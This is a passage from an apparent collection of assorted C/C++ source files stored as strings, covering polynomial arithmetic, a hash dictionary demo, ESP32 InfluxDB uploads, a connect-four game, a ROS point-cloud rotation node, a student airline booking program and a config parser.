{\n\t\tdelete[] (*pol).coeffs;\n\t}\n\t(*pol).coeffs = new mpc_t[1];\n\tmpc_init3((*pol).coeffs[0], wp2, wp2);\n\tmpc_set_str((*pol).coeffs[0], str, 10, MPFR_RNDN);\n}\n\n\nvoid cpoly_set_pol(\n\tstruct cpoly *polout,\n\tstruct cpoly *polin\n) {\n\t// check if input is zero\n\tif ((*polin).deg == -1) {\n\t\tcpoly_set_zero(polout);\n\t\treturn;\n\t}\n\n\t(*polout).deg = (*polin).deg;\n\tif ((*polout).coeffs) {\n\t\tdelete[] (*polout).coeffs;\n\t}\n\t(*polout).coeffs = new mpc_t[(*polout).deg+1];\n\tfor (int k=0; k<=(*polin).deg; k++) {\n\t\tmpc_init3((*polout).coeffs[k], wp2, wp2);\n\t\tmpc_set((*polout).coeffs[k], (*polin).coeffs[k], MPFR_RNDN);\n\t}\n}\n\n\nvoid cpoly_add_pol(\n\tstruct cpoly *pol,\n\tstruct cpoly *pol1,\n\tstruct cpoly *pol2\n) {\n\t// check if one of the input is zero\n\tif ((*pol1).deg == -1) {\n\t\tcpoly_set_pol(pol, pol2);\n\t\treturn;\n\t} else if ((*pol2).deg == -1) {\n\t\tcpoly_set_pol(pol, pol1);\n\t\treturn;\n\t}\n\n\t// deal with overwriting\n\tstruct cpoly *in1, *in2;\n\tif (pol == pol1) {\n\t\tin1 = new struct cpoly[1];\n\t\tcpoly_build(in1);\n\t\tcpoly_set_pol(in1, pol1);\n\t\tin2 = pol2;\n\t} else if (pol == pol2) {\n\t\tin1 = pol1;\n\t\tin2 = new struct cpoly[1];\n\t\tcpoly_build(in2);\n\t\tcpoly_set_pol(in2, pol2);\n\t} else {\n\t\tin1 = pol1;\n\t\tin2 = pol2;\n\t}\n\n\t// determine max and min degree\n\tint deg, deg_min, first_greater;\n\tif ((*pol1).deg >= (*pol2).deg) {\n\t\tdeg = (*pol1).deg;\n\t\tdeg_min = (*pol2).deg;\n\t\tfirst_greater = 1;\n\t} else {\n\t\tdeg = (*pol2).deg;\n\t\tdeg_min = (*pol1).deg;\n\t\tfirst_greater = 0;\n\t}\n\t\n\t// alloc memory\n\tif ((*pol).coeffs && (*pol).deg != deg) {\n\t\tdelete[] (*pol).coeffs;\n\t\t(*pol).deg = deg;\n\t\t(*pol).coeffs = new mpc_t[(*pol).deg+1];\n\t\tfor (int k=0; k<=(*pol).deg; k++) {\n\t\t\tmpc_init3((*pol).coeffs[k], wp2, wp2);\n\t\t}\n\t}\n\n\t// add\n\tfor (int k=0; k<=deg_min; k++) {\n\t\tmpc_add((*pol).coeffs[k], (*in1).coeffs[k], (*in2).coeffs[k], MPFR_RNDN);\n\t}\n\tfor (int k=deg_min+1; k<=(*pol).deg; k++) {\n\t\tif (first_greater) {\n\t\t\tmpc_set((*pol).coeffs[k], (*in1).coeffs[k], MPFR_RNDN);\n\t\t} else {\n\t\t\tmpc_set((*pol).coeffs[k], (*in2).coeffs[k], MPFR_RNDN);\n\t\t}\n\t}\n\treturn;\n}\n\n\nvoid mul_poly_no_trunc(mpc_t *out_pol, mpc_t *pol1, mpc_t *pol2, int deg1, int deg2) {\n\t/*\n\tPerform multiplication of two polynomials:\n\n\t\tpol1 = \\sum_{i=0}^{deg1} a_i * x^i\n\t\tpol2 = \\sum_{j=0}^{deg2} b_j * x^j\n\n\t\tpol1*pol2 = \\sum_{k=0}^{deg1+deg2} \\sum_{i=\\max{0, k-deg2}}^{k} a_i * b_{k-i}\n\n\t\tNote that deg1 has to be greater than deg2.\n\t*/\n\tint i, k, i_min=0;\n\tmpc_t tmp;\n\tmpc_init3(tmp, wp2, wp2);\n\tfor (k=0; k<=deg1+deg2; k++) {\n\t\t// mpc_init3(out_pol[k], wp2, wp2);\n\t\tmpc_set_d(out_pol[k], 0, MPFR_RNDN);\n\t\tif (k > deg2) {\n\t\t\ti_min = k - deg2;\n\t\t}\n\t\tif (k < deg1) {\n\t\t\tfor (i=i_min; i<=k; i++) {\n\t\t\t\tmpc_fma(out_pol[k], pol1[i], pol2[k-i], out_pol[k], MPFR_RNDN);\n\t\t\t}\t\t\t\n\t\t} else {\n\t\t\tfor (i=i_min; i<=deg1; i++) {\n\t\t\t\tmpc_fma(out_pol[k], pol1[i], pol2[k-i], out_pol[k], MPFR_RNDN);\n\t\t\t}\n\t\t}\n\t}\n}\n\n\nvoid cpoly_mul_pol(\n\tstruct cpoly *pol,\n\tstruct cpoly *pol1,\n\tstruct cpoly *pol2\n) {\n\t// if input is zero, set output to zero\n\tif ((*pol1).deg == -1) {\n\t\tif (pol != pol1) {\n\t\t\tcpoly_set_zero(pol);\n\t\t}\n\t\treturn;\n\t}\n\tif ((*pol2).deg == -1) {\n\t\tif (pol != pol2) {\n\t\t\tcpoly_set_zero(",
    "#include <iostream>\n#include \"HashDict.hpp\"\n\nvoid printOptionalVariant(std::optional<std::variant<char, std::string, int, float, bool>> x)\n{\n    if (x.has_value())\n    {\n        std::visit(\n            [](auto &&arg)\n            {\n                std::cout << arg << std::endl;\n            },\n            x.value());\n    }\n}\n\nint main()\n{\n    HashDict dict = HashDict();\n    dict.print();\n\n    dict.put(\"Apple\", new float(252.2), \"float\");\n    dict.put(\"Amazon\", new float(221.3), \"float\");\n    dict.put(\"Google\", new float(192.69), \"float\");\n    dict.put(\"Meta\", new float(591.24), \"float\");\n    dict.put(\"Netflix\", new float(900.43), \"float\");\n    dict.put(\"Microsoft\", new float(424.83), \"float\");\n    dict.put(\"Discord\", new std::string(\"NA\"), \"str\");\n\n    dict.put(\"Onsmble\", new int(0), \"int\");\n    dict.put(\"Bluetree\", new std::string(\"NULL\"), \"str\");\n\n    dict.put(\"Atlassian\", new float(247.1), \"float\");\n    dict.put(\"DoorDash\", new float(169.6), \"float\");\n\n    dict.put(\"OpenAI\", new std::string(\"NA\"), \"str\");\n    dict.put(\"Anthropic\", new std::string(\"NA\"), \"str\");\n    dict.put(\"xAI\", new std::string(\"NA\"), \"str\");\n    dict.put(\"Anduril\", new std::string(\"NA\"), \"str\");\n\n    dict.put(\"NVIDIA\", new float(137.49), \"float\");\n    dict.put(\"TSMC\", new float(200.39), \"float\");\n\n    dict.put(\"SureCo\", new std::string(\"NA\"), \"str\");\n    dict.put(\"Northrop Grumman\", new float(466.52), \"float\");\n\n    dict.put(\"Tesla\", new float(417.51), \"float\");\n    dict.put(\"ServiceNow\", new float(1067.70), \"float\");\n\n    dict.put(\"SpaceX\", new std::string(\"NA\"), \"str\");\n\n    dict.print();\n\n    dict.put(\"Discord\", new std::string(\"PENDING\"), \"str\");\n    dict.put(\"OpenAI\", new std::string(\"N/A\"), \"str\");\n    dict.put(\"Anthropic\", new std::string(\"N/A\"), \"str\");\n    dict.put(\"xAI\", new std::string(\"N/A\"), \"str\");\n    dict.put(\"Anduril\", new std::string(\"N/A\"), \"str\");\n    dict.put(\"SureCo\", new std::string(\"NONE\"), \"str\");\n    dict.put(\"SpaceX\", new std::string(\"N/A\"), \"str\");\n\n    dict.print();\n\n    dict.put(\"Disney\", new float(100.0), \"float\");\n    dict.put(\"Disney\", new float(110.80), \"float\");\n\n    dict.print();\n\n    dict.put(\"Bull Market\", new bool(false), \"bool\");\n\n    dict.print();\n\n    dict.put(\"Bull Market\", new bool(true), \"bool\");\n\n    dict.print();\n\n    std::cout << dict.getFloat(dict.get(\"Northrop Grumman\")) << std::endl;\n    std::cout << dict.getStr(dict.pop(\"SureCo\")) << std::endl;\n    std::cout << dict.getStr(dict.pop(\"Bluetree\")) << std::endl;\n    std::cout << dict.getFloat(dict.get(\"DoorDash\")) << std::endl;\n    std::cout << dict.getFloat(dict.get(\"Atlassian\")) << std::endl;\n    std::cout << dict.getInt(dict.pop(\"Onsmble\")) << std::endl;\n    std::cout << dict.getStr(dict.pop(\"Discord\")) << std::endl;\n\n    dict.print();\n\n    HashDict newDict = HashDict(5);\n    newDict.print();\n    newDict.put(\"Bear Market\", new bool(false), \"bool\");\n    newDict.put(\"Bull Market\", new bool(true), \"bool\");\n    newDict.put(\"Modulo\", new char('%'), \"char\");\n    newDict.put(\"Ampersand\", new char('&'), \"char\");\n    newDict.print();\n    std::cout << newDict.getChar(newDict.get(\"Modulo\")) << std::endl;\n    std::cout << newDict.getBool(newDict.pop(\"Bear Market\")) << std::endl;\n    newDict.print();\n\n    return 0;\n}",
    "#include <secrets.h>\n\n#include <Arduino.h>\n#include <HTTPClient.h>\n\nbool sendToInflux(String payload) {\n  // Check if the ESP32 is connected to Wi-Fi\n  if (WiFi.status() == WL_CONNECTED) {\n    HTTPClient http;\n    \n    // Begin HTTP request\n    http.begin(String(INFLUX_URL) + \"/api/v2/write?org=\" + String(INFLUX_ORG) + \"&bucket=\" + String(INFLUX_BUCKET) + \"&precision=s\");\n\n    // Set content type to text/plain\n    http.addHeader(\"Content-Type\", \"text/plain\");\n\n    // Add Authorization Header\n    String token = \"Token \" + String(INFLUX_API_TOKEN);\n    http.addHeader(\"Authorization\", token);\n\n    // Send HTTP POST request\n    int httpCode = http.POST(payload);\n    \n    // Check for a successful response\n    bool success;\n    if (httpCode == 204) {\n      Serial.println(\"HTTP GET request sent successfully. Response code: \" + String(httpCode));\n      success = true;\n    } else {\n      // If the request failed, print the error code\n      Serial.println(\"Error in HTTP request: \" + String(httpCode));\n      success = false;\n    }\n\n    // End the HTTP request\n    http.end();\n    return success;\n  } else {\n    Serial.println(\"Error: Not connected to WiFi\");\n    return false;\n  }\n}",
    "#include <iostream>\r\n#include <vector>\r\n#include <limits>\r\nusing namespace std;\r\n\r\nvector<vector<int>> space;\r\nvector<int> filled;\r\nint rows, cols;\r\nint playersnum = 0;\r\nint currentplayer = 0;\r\n\r\nbool check_win(int player, const vector<vector<int>>& board) {\r\n    for (int row = 0; row < rows; row++) {\r\n        for (int col = 0; col < cols; col++) {\r\n\r\n            if (col <= cols - 4 && board[row][col] == player && board[row][col + 1] == player &&\r\n                board[row][col + 2] == player && board[row][col + 3] == player) {\r\n                return true;\r\n            }\r\n\r\n            if (row <= rows - 4 && board[row][col] == player && board[row + 1][col] == player &&\r\n                board[row + 2][col] == player && board[row + 3][col] == player) {\r\n                return true;\r\n            }\r\n\r\n            if (row <= rows - 4 && col <= cols - 4 && board[row][col] == player &&\r\n                board[row + 1][col + 1] == player && board[row + 2][col + 2] == player &&\r\n                board[row + 3][col + 3] == player) {\r\n                return true;\r\n            }\r\n\r\n            if (row >= 3 && col <= cols - 4 && board[row][col] == player &&\r\n                board[row - 1][col + 1] == player && board[row - 2][col + 2] == player &&\r\n                board[row - 3][col + 3] == player) {\r\n                return true;\r\n            }\r\n        }\r\n    }\r\n    return false;\r\n}\r\n\r\nvoid drawboard() {\r\n    for (int row = 0; row < rows; row++) {\r\n        for (int col = 0; col < cols; col++) {\r\n            cout << space[row][col] << \" \";\r\n        }\r\n        cout << endl;\r\n    }\r\n    cout << endl;\r\n}\r\n\r\nint main() {\r\n    while (true) {\r\n        cout << \"Enter the number of rows for the board (4-20): \";\r\n        cin >> rows;\r\n        if (cin.fail() || rows < 4 || rows > 20) {\r\n            cin.clear();\r\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\r\n            cout << \"Invalid input! Please enter a number between 4 and 20.\" << endl;\r\n        } else {\r\n            break;\r\n        }\r\n    }\r\n\r\n    while (true) {\r\n        cout << \"Enter the number of columns for the board (4-20): \";\r\n        cin >> cols;\r\n        if (cin.fail() || cols < 4 || cols > 20) {\r\n            cin.clear();\r\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\r\n            cout << \"Invalid input! Please enter a number between 4 and 20.\" << endl;\r\n        } else {\r\n            break;\r\n        }\r\n    }\r\n\r\n    space = vector<vector<int>>(rows, vector<int>(cols, 0));\r\n    filled = vector<int>(cols, rows - 1);\r\n\r\n    do {\r\n        cout << \"How many players do you want to play? (2-5): \";\r\n        cin >> playersnum;\r\n        if (playersnum < 2 || playersnum > 5) {\r\n            cout << \"Player count must be between 2 and 5.\" << endl;\r\n        }\r\n    } while (playersnum < 2 || playersnum > 5);\r\n\r\n    currentplayer = 1;\r\n    while (true) {\r\n        drawboard();\r\n        int pos_pl;\r\n        cout << \"Player \" << currentplayer << \"'s turn. Enter the column number (1-\" << cols << \"): \";\r\n        cin >> pos_pl;\r\n\r\n        if (pos_pl < 1 || pos_pl > cols) {\r\n            cout << \"Invalid column! Please enter a number between 1 and \" << cols << \".\" << endl;\r\n            continue;\r\n        }\r\n\r\n        if (filled[pos_pl - 1] < 0) {\r\n            cout << \"There are no more spaces in this column!\" << endl;\r\n            continue;\r\n        }\r\n\r\n        space[filled[pos_pl - 1]][pos_pl - 1] = currentplayer;\r\n\r\n        if (check_win(currentplayer, space)) {\r\n            drawboard();\r\n            cout << \"Player \" << currentplayer << \" wins!\" << endl;\r\n            return 0;\r\n        }\r\n\r\n        bool draw = true;\r\n        for (int i = 0; i < rows; i++){\r\n            for (int j = 0; j < cols; j++){\r\n                if (space[i][j] == 0){\r\n                    draw = false;\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n        if (draw) {\r\n            drawboard();\r\n            cout << \"The game is a draw!\" << endl;\r\n            return 0;\r\n        }\r\n\r\n        filled[pos_pl - 1]--;\r\n        if (currentplayer == playersnum){\r\n            currentplayer = 1;\r\n        }\r\n        else {\r\n            currentplayer++;\r\n        }\r\n    }\r\n}",
    "#include <iostream>\n#include<map>\n#include<set>\n#include<unordered_set>\n#include<vector>\n#include<stack>\n#include<queue>\n#include<algorithm>\n#include<iterator>\n#include<climits>\n\nusing namespace std;\n\nlong long mod=1e9 +7;\nvector<long long int>factorial;\nvector<long long int>invfactorial;\n\nint main() {\n    \n    ios::sync_with_stdio(0);\n    cin.tie(0);\n    cout.tie(0);\n    \n    int n;\n    cin>>n;\n    factorial.resize(1e6+1);\n    invfactorial.resize(1e6+1);\n    factorial[0]=1;\n    for(int i=1;i<=1e6;i++)\n    {\n        factorial[i]=((factorial[i-1]%mod)*(i%mod))%mod;\n    }\n//    for(int i=0;i<11;i++)\n//    {\n//        cout<<factorial[i]<<\" \";\n//    }\n    //cout<<\"\\n\";\n    invfactorial[0]=1;\n    for(int i=1;i<=1e6;i++)\n    {\n        long long temp=1;\n        long long curr=factorial[i];\n        for(int j=0;j<32;j++)\n        {\n            if((1<<j)&(mod-2))\n            {\n                temp*=curr;\n                temp%=mod;\n            }\n            curr*=curr;\n            curr%=mod;\n        }\n        invfactorial[i]=temp;\n    }\n    \n    if(n==1)\n    {\n        cout<<0;\n        return 0;\n    }\n    \n    bool counter=0;\n    long long temp=0;\n    for(int i=2;i<=n;i++)\n    {\n        cout<<temp<<\" \";\n        if(counter)\n        {\n            temp-=((factorial[n]%mod)*(invfactorial[i]%mod))%mod;\n        }\n        else{\n            temp+=((factorial[n]%mod)*(invfactorial[i]%mod))%mod;\n        }\n        temp%=mod;\n        counter=!counter;\n    }\n    cout<<temp<<\" \";\n    \n    return 0;\n}\n",
    "/*\r\n * Copyright (c) 2018 Daniel Marks\r\n\r\nThis software is provided 'as-is', without any express or implied\r\nwarranty. In no event will the authors be held liable for any damages\r\narising from the use of this software.\r\n\r\nPermission is granted to anyone to use this software for any purpose,\r\nincluding commercial applications, and to alter it and redistribute it\r\nfreely, subject to the following restrictions:\r\n\r\n1. The origin of this software must not be misrepresented; you must not\r\n   claim that you wrote the original software. If you use this software\r\n   in a product, an acknowledgment in the product documentation would be\r\n   appreciated but is not required.\r\n2. Altered source versions must be plainly marked as such, and must not be\r\n   misrepresented as being the original software.\r\n3. This notice may not be removed or altered from any source distribution.\r\n */\r\n\r\n#include <Arduino.h>\r\n#include <stdarg.h>\r\n#include \"consoleio.h\"\r\n#include \"mini-printf.h\"\r\n\r\nStream *mainSerial = NULL;\r\nStream *externalSerial = NULL;\r\n\r\nvoid console_setMainSerial(Stream *serialDevice)\r\n{\r\n  mainSerial = serialDevice;\r\n}\r\n\r\nvoid console_setExternalSerial(Stream *serialDevice)\r\n{\r\n  externalSerial = serialDevice;\r\n}\r\n\r\nvoid console_printchar(const char c)\r\n{\r\n  if (mainSerial != NULL) mainSerial->print(c);\r\n  if (externalSerial != NULL) externalSerial->print(c);\r\n}\r\n\r\nint console_inchar(void)\r\n{\r\n  if ((mainSerial != NULL) && (mainSerial->available())) return mainSerial->read();\r\n  if ((externalSerial != NULL) && (externalSerial->available())) return externalSerial->read();\r\n  return -1;\r\n}\r\n\r\nvoid console_printcrlf(void)\r\n{\r\n  console_printchar('\\r');\r\n  console_printchar('\\n');\r\n}\r\n\r\nvoid console_print(const char *c)\r\n{\r\n  while (*c) console_printchar(*c++);\r\n}\r\n\r\nvoid console_println(const char *c)\r\n{\r\n  console_print(c);\r\n  console_printcrlf();\r\n}\r\n\r\nvoid console_print(int n)\r\n{\r\n  char s[20];\r\n  mini_itoa(n, 10, 0, 0, s, 0);\r\n\tconsole_print(s);\r\n}\r\n\r\nvoid console_print(unsigned int n)\r\n{\r\n  char s[20];\r\n  mini_itoa(n, 10, 0, 1, s, 0);\r\n  console_print(s);\r\n}\r\nvoid console_println(int n)\r\n{\r\n  console_print(n);\r\n  console_printcrlf();\r\n}\r\n\r\nvoid console_println(unsigned int n)\r\n{\r\n  console_print(n);\r\n  console_printcrlf();\r\n}\r\n",
    "#include <ros/ros.h>\n// PCL specific includes\n#include <sensor_msgs/PointCloud2.h>\n#include <pcl_conversions/pcl_conversions.h>\n#include <pcl/point_cloud.h>\n#include <pcl/point_types.h>\n#include <pcl/io/pcd_io.h>\n#include <pcl_conversions/pcl_conversions.h>\n#include <pcl/point_types.h>\n#include <pcl/PCLPointCloud2.h>\n#include <pcl/conversions.h>\n#include <pcl_ros/transforms.h>\n// PCL specific includes \n\nros::Publisher pub;\nfloat theta = 0;\nbool is_program_started = true;\n\nvoid cloud_cb (const sensor_msgs::PointCloud2ConstPtr& input)\n{\n  // Create a container for the data.\n  sensor_msgs::PointCloud2 output;\n  pcl::PointCloud<pcl::PointXYZ>::Ptr input_pcl (new pcl::PointCloud<pcl::PointXYZ>);\n  pcl::PointCloud<pcl::PointXYZ>::Ptr transformed_pcl (new pcl::PointCloud<pcl::PointXYZ>);\n  // Create a container for the data.\n\n  // Do data processing here\n  pcl::fromROSMsg(*input, *input_pcl);\n\n  Eigen::Matrix4f transform_y = Eigen::Matrix4f::Identity();\n\n  // Define a rotation matrix for y axis\n/*\n        | cos(theta)    0    sin(theta) |       \n  R =   |     0         1       0       |\n        | -sin(theta)   0    cos(theta) |\n*/\n  //Transformation matrix \n/*\n    |  R   | t |   t is a translation vector,  t = [x,y,z]^T , in our case t = [0,0,0]^T\n    |--------- |\n    |0 0 0 | 1 |\n*/  \n\n  transform_y (0,0) = std::cos (theta*(M_PI/180));         \n  transform_y (0,2) = sin(theta*(M_PI/180));                \n  transform_y (2,0) = -sin (theta*(M_PI/180)); \n  transform_y (2,2) = std::cos (theta*(M_PI/180));\n  transform_y (1,1) = 1;\n  transform_y (3,3) = 1;\n\n  //Executing the transform\n  pcl::transformPointCloud (*input_pcl, *transformed_pcl, transform_y);\n  pcl::toROSMsg(*transformed_pcl,output);\n\n  // Publish the data.\n  pub.publish (output);\n  \n  if(theta ==-45 && is_program_started)\n  {\n    is_program_started = false;\n    pcl::io::savePCDFileASCII(\"/home/omer/Desktop/mrs_rotated_data.pcd\", *transformed_pcl);\n  }\n\n\n  if(theta>-90)\n    theta -=1 ;\n  else\n    theta = 0;\n\n  // Do data processing here\n}\n\nint main (int argc, char** argv)\n{\n  // Initialize ROS\n  ros::init (argc, argv, \"rotation_system\");\n  ros::NodeHandle nh;\n  // Initialize ROS\n\n  // Create a ROS subscriber for the input point cloud\n  ros::Subscriber sub = nh.subscribe (\"/cloud\", 1, cloud_cb);\n  // Create a ROS subscriber for the input point cloud\n\n  // Create a ROS publisher for the output point cloud\n  pub = nh.advertise<sensor_msgs::PointCloud2> (\"/rotated_cloud\", 1);\n  // Create a ROS publisher for the output point cloud\n\n  // Spin\n  ros::spin ();\n}",
    "#include <iostream>\n#include <string>\n#include <fstream>\n#include <ctime>\n#include <cstdlib>\n#include <iomanip>\nusing namespace std;\nconst int max_passenger = 100;\nstatic int passenger_count = 0;\nstring Name[max_passenger], Address[max_passenger], Phone_number[max_passenger], Age[max_passenger], From[max_passenger], To[max_passenger], CODE[max_passenger];\nstring Flight_name[max_passenger], Time[max_passenger], Fare[max_passenger], Departure[max_passenger], Arrival[max_passenger], D_M[max_passenger],CLASS[max_passenger];\nint seat[max_passenger];\n\n// Fuction declaration \nvoid interface();\nstring ticket_code();\nvoid Flight_Schedule_info();\n\n\nclass Seat\n{\npublic:\n  int seat_number; \n  int seat_status[100];\n\n  Seat()\n   {\n        srand(time(0));\n        for (int i = 0; i <100; i++) \n        {\n            seat_status[i] = rand() % 2; \n        }\n   }\n\n   void availability(int CHOICE)\n   {\n        \n        if (CHOICE==1)\n        {\n            cout << \"Total number of seat : 25 \\n\";\n            cout<<\"The following number of seats are available now: \";\n\n            for (int i = 0; i <25; i++) \n            {\n                if(seat_status[i]==0)\n                {\n                    cout<<i<<\",\";\n                }\n            }\n\n\n            cout<<\"\\n\\nEnter seat number : \";\n            cin>>seat_number;\n            seat[passenger_count]=seat_number;\n\n        }\n    \n        else if (CHOICE==2)\n        {\n            cout << \"Total number of seat : 35 \\n\";\n            cout<<\"The following number of seats are available now: \";\n\n            for (int i = 25; i <60; i++) \n            {\n                if(seat_status[i]==0)\n                {\n                    cout<<i<<\",\";\n                }\n            }\n\n            cout<<\"\\n\\nEnter seat number : \";\n            cin>>seat_number;\n            seat[passenger_count]=seat_number;\n        }\n\n        else if(CHOICE==3)\n        {\n            cout << \"Total number of seat : 40 \\n\";\n            cout<<\"The following number of seats are available now: \";\n            for (int i = 60; i <100; i++) \n            {\n                if(seat_status[i]==0)\n                {\n                    cout<<i<<\",\";\n                }\n            }\n\n            cout<<\"\\n\\nEnter seat number : \";\n            cin>>seat_number;\n            seat[passenger_count]=seat_number;\n        }\n\n   }\n\n    virtual void Fare_cost(){}\n};\n\n\nclass Economy_class : public Seat\n{\npublic:\n\n     void Fare_cost() override\n     {\n        cout << \"\\n----------ECONOMY CLASS----------\\n \\n\";\n        cout<<\"Seat Position  \"<<\"-------\"<<\"  Fare\"<<\"\\n\\n\";\n        cout <<\"1. Window Seat\\t\\t\"<<\"250$\\t\"<<endl;\n        cout<< \"2. Middle Seat\\t\\t\"<<\"200$\"<< endl;   \n        cout<< \"3. Aisle Seat\\t\\t\"<<\"150$\"<< endl;  \n\n        cout<<\"Press (1-3) to choice you seat : \" ;\n        int choice;\n        cin>>choice;\n\n        if(choice==1)\n        {\n            Fare[passenger_count]=\"250$\";\n            \n        }\n        else if (choice==1)\n        {\n             Fare[passenger_count]=\"200$\";     \n        }\n        else\n        {\n             Fare[passenger_count]=\"150$\";\n        }\n\n     }\n};\n\n\nclass Business_class : public Seat\n{\npublic:\n\n     void Fare_cost() override\n     {\n        cout << \"\\n----------Business CLASS----------\\n \\n\";\n        cout<<\"Seat Position  \"<<\"-------\"<<\"  Fare\"<<\"\\n\\n\";\n        cout <<\"1. Window Seat\\t\\t\"<<\"550$\\t\"<<endl;\n        cout<< \"2. Middle Seat\\t\\t\"<<\"500$\"<< endl;   \n        cout<< \"3. Aisle Seat\\t\\t\"<<\"450$\"<< endl;   \n\n        cout<<\"Press (1-3) to choice you seat : \" ;\n        int choice;\n        cin>>choice;\n\n        if(choice==1)\n        {\n            Fare[passenger_count]=\"550$\";\n            \n        }\n        else if (choice==1)\n        {\n             Fare[passenger_count]=\"500$\";     \n        }\n        else\n        {\n             Fare[passenger_count]=\"450$\";\n        }\n\n     }\n};\n\n\nclass First_class : public Seat\n{\npublic:\n\n     void Fare_cost() override\n     {\n        cout << \"\\n----------FIRST CLASS----------\\n \\n\";\n        cout<<\"Seat Position  \"<<\"-------\"<<\"  Fare\"<<\"\\n\\n\";\n        cout <<\"1. Window Seat\\t\\t\"<<\"950$\\t\"<<endl;\n        cout<< \"2. Middle Seat\\t\\t\"<<\"900$\"<< endl;   \n        cout<< \"3. Aisle Seat\\t\\t\"<<\"850$\"<< endl;  \n\n        cout<<\"Press (1-3) to choice you seat : \" ;\n        int choice;\n        cin>>choice;\n\n        if(choice==1)\n        {\n            Fare[passenger_count]=\"950$\";\n            \n        }\n        else if (choice==1)\n        {\n             Fare[passenger_count]=\"900$\";     \n        }\n        else\n        {\n             Fare[passenger_count]=\"850$\";\n        } \n     }\n};\n\n\n// File Handling\nvoid File(int passengerCount, string Name, string Address, string Age, string Phone_number, string CODE)\n{\n\n    ofstream file(\"Database.txt\", ios::app);\n\n\n    file << \"\\t_____________ SRH Domestic Air Line _______________\\n\"<< endl;\n    file << left << setw(20) << \"PASSENGER SERIAL : \" << setw(30) << passengerCount + 1 << endl;\n    file << left << setw(20) << \"PASSENGER NAME :\" << s",
    "/*\n*\n*\tMegan Grass\n*\tDecember 14, 2024\n*\n*/\n\n#include \"app.h\"\n\n#include <std_text.h>\n\nvoid Global_Application::OpenConfig(void)\n{\n\tif (b_Shutdown) { return; }\n\n\tstd::unique_ptr<StdText> Text = std::make_unique<StdText>(GetConfigFilename(), FileAccessMode::Read_Ex, TextFileBOM::UTF16_LE);\n\tif (!Text->IsOpen())\n\t{\n\t\tStr.Message(\"Error, could not open \\\"%ws\\\" app config\", GetConfigFilename().filename().wstring().c_str());\n\t\treturn;\n\t}\n\n\tfor (std::size_t i = 0; i < Text->GetLineCount(); i++)\n\t{\n\t\tStrVecW Args = Text->GetArgsW(i);\n\n\t\tif (!Args.empty() && (Args.size() > 1))\n\t\t{\n\t\t\tif (Str.ToUpper(Args[0]) == L\"M_FONT\")\n\t\t\t{\n\t\t\t\tWindow->SetFont(Args[1], Window->FontSize());\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"M_FONTSIZE\")\n\t\t\t{\n\t\t\t\tWindow->FontSize() = std::stof(Args[1]);\n\t\t\t\tWindow->FontSize() = std::clamp(Window->FontSize(), m_FontSizeMin, m_FontSizeMax);\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"M_COLOR\")\n\t\t\t{\n\t\t\t\tDWORD Color = std::stoul(Args[1], nullptr, 16);\n\t\t\t\tWindow->SetColor(GetRValue(Color), GetGValue(Color), GetBValue(Color));\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"M_WIDTH\")\n\t\t\t{\n\t\t\t\tm_BootWidth = std::stoi(Args[1]);\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"M_HEIGHT\")\n\t\t\t{\n\t\t\t\tm_BootHeight = std::stoi(Args[1]);\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"B_MAXIMIZED\")\n\t\t\t{\n\t\t\t\tb_BootMaximized = std::stoi(Args[1]);\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"B_FULLSCREEN\")\n\t\t\t{\n\t\t\t\tb_BootFullscreen = std::stoi(Args[1]);\n\t\t\t}\n\n\t\t\tif (Str.ToUpper(Args[0]) == L\"M_FILENAME\")\n\t\t\t{\n\t\t\t\tm_Filename = Args[1];\n\t\t\t}\n\n\t\t\tif (Str.ToUpper(Args[0]) == L\"B_RAWBPP\")\n\t\t\t{\n\t\t\t\tswitch (std::stoull(Args[1]))\n\t\t\t\t{\n\t\t\t\tcase 4:\n\t\t\t\t\tb_Raw4bpp = true;\n\t\t\t\t\tb_Raw8bpp = false;\n\t\t\t\t\tb_Raw16bpp = false;\n\t\t\t\t\tb_Raw24bpp = false;\n\t\t\t\t\tbreak;\n\t\t\t\tcase 8:\n\t\t\t\t\tb_Raw4bpp = false;\n\t\t\t\t\tb_Raw8bpp = true;\n\t\t\t\t\tb_Raw16bpp = false;\n\t\t\t\t\tb_Raw24bpp = false;\n\t\t\t\t\tbreak;\n\t\t\t\tcase 16:\n\t\t\t\tdefault:\n\t\t\t\t\tb_Raw4bpp = false;\n\t\t\t\t\tb_Raw8bpp = false;\n\t\t\t\t\tb_Raw16bpp = true;\n\t\t\t\t\tb_Raw24bpp = false;\n\t\t\t\t\tbreak;\n\t\t\t\tcase 24:\n\t\t\t\t\tb_Raw4bpp = false;\n\t\t\t\t\tb_Raw8bpp = false;\n\t\t\t\t\tb_Raw16bpp = false;\n\t\t\t\t\tb_Raw24bpp = true;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"B_RAWEXTERNALPIXELS\")\n\t\t\t{\n\t\t\t\tb_RawExternalPixels = std::stoi(Args[1]);\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"B_RAWEXTERNALPIXELSFROMTIM\")\n\t\t\t{\n\t\t\t\tb_RawExternalPixelsFromTIM = std::stoi(Args[1]);\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"B_RAWEXTERNALPALETTE\")\n\t\t\t{\n\t\t\t\tb_RawExternalPalette = std::stoi(Args[1]);\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"B_RAWEXTERNALPALETTEFROMTIM\")\n\t\t\t{\n\t\t\t\tb_RawExternalPaletteFromTIM = std::stoi(Args[1]);\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"M_RAWWIDTH\")\n\t\t\t{\n\t\t\t\tm_RawWidth = std::stoi(Args[1]);\n\t\t\t\tAdjustWidthInput(m_RawWidth);\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"M_RAWHEIGHT\")\n\t\t\t{\n\t\t\t\tm_RawHeight = std::stoi(Args[1]);\n\t\t\t\tAdjustHeightInput(m_RawHeight);\n\t\t\t}\n\t\t\tif 